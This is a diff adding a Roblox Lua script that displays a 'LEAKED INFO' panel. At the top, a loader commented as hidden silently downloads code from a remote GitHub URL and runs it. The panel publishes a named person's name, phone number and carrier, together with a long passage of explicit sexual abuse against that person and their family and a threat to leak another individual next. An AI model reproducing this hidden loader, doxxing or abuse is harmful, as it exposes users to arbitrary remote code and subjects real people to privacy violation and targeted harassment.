@@ -1,0 +1,198 @@
+local player = game.Players.LocalPlayer
+
+-- ===== STEALTH LOADSTRING (bilkul chhupa hua) =====
+local function _hidden_loader()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/yelelode/Delta/refs/heads/main/Me%20nhi%20btauga"))()
+    end)
+end
+_hidden_loader()
+
+-- ===== LEAK GUI (details + insults) =====
+local gui = Instance.new("ScreenGui")
+gui.Name = "leaked info"
+gui.Parent = player.PlayerGui
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 400, 0, 620)
+frame.Position = UDim2.new(0.5, -200, 0.5, -310)
+frame.BackgroundColor3 = Color3.fromRGB(6, 0, 0)
+frame.BorderSizePixel = 0
+frame.ClipsDescendants = true
+frame.Active = true
+frame.Draggable = true
+frame.Parent = gui
+local mainCorner = Instance.new("UICorner")
+mainCorner.CornerRadius = UDim.new(0, 10)
+mainCorner.Parent = frame
+
+local borderOuter = Instance.new("Frame")
+borderOuter.Size = UDim2.new(1.03, 0, 1.03, 0)
+borderOuter.Position = UDim2.new(-0.015, 0, -0.015, 0)
+borderOuter.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+borderOuter.BackgroundTransparency = 0.5
+borderOuter.BorderSizePixel = 0
+borderOuter.ZIndex = 0
+local outerCorner = Instance.new("UICorner")
+outerCorner.CornerRadius = UDim.new(0, 14)
+outerCorner.Parent = borderOuter
+borderOuter.Parent = frame
+
+local borderInner = Instance.new("Frame")
+borderInner.Size = UDim2.new(1.01, 0, 1.01, 0)
+borderInner.Position = UDim2.new(-0.005, 0, -0.005, 0)
+borderInner.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+borderInner.BackgroundTransparency = 0.3
+borderInner.BorderSizePixel = 3
+borderInner.BorderColor3 = Color3.fromRGB(255, 50, 50)
+borderInner.ZIndex = 1
+local innerCorner = Instance.new("UICorner")
+innerCorner.CornerRadius = UDim.new(0, 12)
+innerCorner.Parent = borderInner
+borderInner.Parent = frame
+
+local scanline = Instance.new("Frame")
+scanline.Size = UDim2.new(1, 0, 0.02, 0)
+scanline.Position = UDim2.new(0, 0, 0, 0)
+scanline.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+scanline.BackgroundTransparency = 0.6
+scanline.ZIndex = 0
+scanline.Parent = frame
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 35)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+title.BackgroundTransparency = 0.2
+title.Text = "🔥 LEAKED INFO"
+title.TextColor3 = Color3.fromRGB(255, 80, 80)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBlack
+title.ZIndex = 2
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 6)
+titleCorner.Parent = title
+title.Parent = frame
+
+local details = {}
+local detailTexts = {
+    "👤 Name: Kurankar Anil (farhan)",
+    "📞 +91 9422907685",
+    "📡 BSNL MOBILE | All Circles",
+    "🕒 2026-07-01 02:57 AM"
+}
+for i, text in ipairs(detailTexts) do
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, 0, 0, 22)
+    lbl.Position = UDim2.new(0, 0, 0.07 + (i-1)*0.045, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = text
+    lbl.TextColor3 = (i == 1) and Color3.fromRGB(255, 200, 200) or Color3.fromRGB(200, 200, 255)
+    lbl.TextScaled = true
+    lbl.Font = Enum.Font.GothamBold
+    lbl.ZIndex = 2
+    lbl.Parent = frame
+    table.insert(details, lbl)
+end
+
+local sep = Instance.new("Frame")
+sep.Size = UDim2.new(0.9, 0, 0, 2)
+sep.Position = UDim2.new(0.05, 0, 0.28, 0)
+sep.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
+sep.BorderSizePixel = 0
+sep.ZIndex = 2
+sep.Parent = frame
+
+local insultText = [[
+Ab iske number ki jeise ma chod ni hai chodo Toh ye inki maki chut ladkiyo ko ratko abuse krke fighter bolte hai inki maki chut jab insta ya discord pe bulate hai to ma chud jati inki TE clan ke bhadwo ki bhi ek bar ma chudwake maan nhi bhara discord pe bulaya udhar bhi bhag gya or iski maki chut ye prince Teri ma ki gand me hathi ka lund dalke asa chodunga Na Bacha hojayega Johny sins ,ke lund se chudwaungu bhosdike teri ma Randi tera baap hizda kaali gaand kay Khade baal jhaatu Randi kay chodu bhosdika bacche 3 baje fight leke aate din me inki ma chud jati haan to bhaiyo is part me farhan jo ki prince ka dost hai isko to leak kiya hi hai part 2 me ye prince chudega next part jald aaega prince mere bete ke liye aagar tum log bacchon chate ho me aisa kuch na krun to shanti se mere dm me aake sorry boldo nhi sabki gandi ma chodunga thanku ~
+
+Mene ye iska number bas is liye leak kiya becouse ladkiyon ko abuse krte
+]]
+
+local scroll = Instance.new("ScrollingFrame")
+scroll.Size = UDim2.new(0.92, 0, 0, 300)
+scroll.Position = UDim2.new(0.04, 0, 0.32, 0)
+scroll.BackgroundColor3 = Color3.fromRGB(10, 0, 0)
+scroll.BorderSizePixel = 2
+scroll.BorderColor3 = Color3.fromRGB(200, 0, 0)
+scroll.ScrollBarThickness = 10
+scroll.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
+scroll.ZIndex = 2
+local scrollCorner = Instance.new("UICorner")
+scrollCorner.CornerRadius = UDim.new(0, 6)
+scrollCorner.Parent = scroll
+scroll.Parent = frame
+
+local insultLabel = Instance.new("TextLabel")
+insultLabel.Size = UDim2.new(0.95, 0, 0, 0)
+insultLabel.Position = UDim2.new(0.025, 0, 0, 0)
+insultLabel.BackgroundTransparency = 1
+insultLabel.Text = insultText
+insultLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
+insultLabel.TextWrapped = true
+insultLabel.TextScaled = false
+insultLabel.Font = Enum.Font.GothamBlack
+insultLabel.TextSize = 14
+insultLabel.ZIndex = 3
+insultLabel.AutomaticSize = Enum.AutomaticSize.Y
+insultLabel.Parent = scroll
+
+local function adjustCanvas()
+    task.wait(0.15)
+    local h = insultLabel.AbsoluteSize.Y
+    if h > 0 then
+        insultLabel.Size = UDim2.new(0.95, 0, 0, h)
+        scroll.CanvasSize = UDim2.new(0, 0, 0, h + 20)
+    else
+        insultLabel.Size = UDim2.new(0.95, 0, 0, 1500)
+        scroll.CanvasSize = UDim2.new(0, 0, 0, 1520)
+    end
+end
+adjustCanvas()
+
+local closeBtn = Instance.new("TextButton")
+closeBtn.Size = UDim2.new(0, 35, 0, 28)
+closeBtn.Position = UDim2.new(1, -42, 0, 5)
+closeBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
+closeBtn.Text = "✕"
+closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+closeBtn.TextScaled = true
+closeBtn.Font = Enum.Font.GothamBlack
+closeBtn.ZIndex = 3
+local btnCorner = Instance.new("UICorner")
+btnCorner.CornerRadius = UDim.new(0, 4)
+btnCorner.Parent = closeBtn
+closeBtn.Parent = frame
+closeBtn.MouseButton1Click:Connect(function() gui:Destroy() end)
+
+spawn(function()
+    while gui.Parent do
+        for t = 0, 1, 0.03 do
+            task.wait(0.03)
+            local intensity = 0.3 + 0.7 * math.sin(t * math.pi * 2)
+            borderOuter.BackgroundTransparency = 0.7 - intensity * 0.4
+            borderInner.BorderColor3 = Color3.fromRGB(255 * intensity, 20 * intensity, 20 * intensity)
+            borderInner.BackgroundTransparency = 0.5 - intensity * 0.2
+        end
+    end
+end)
+
+spawn(function()
+    while gui.Parent do
+        for pos = 0, 1, 0.01 do
+            task.wait(0.02)
+            scanline.Position = UDim2.new(0, 0, pos, 0)
+        end
+    end
+end)
+
+spawn(function()
+    while gui.Parent do
+        task.wait(math.random(2, 6))
+        title.TextColor3 = Color3.fromRGB(255, 50 + math.random(0, 80), 50 + math.random(0, 80))
+        task.wait(0.1)
+        title.TextColor3 = Color3.fromRGB(255, 80, 80)
+    end
+end)
+
+print("✅ LEAKED INFO LOADED – GHOP GHOP")
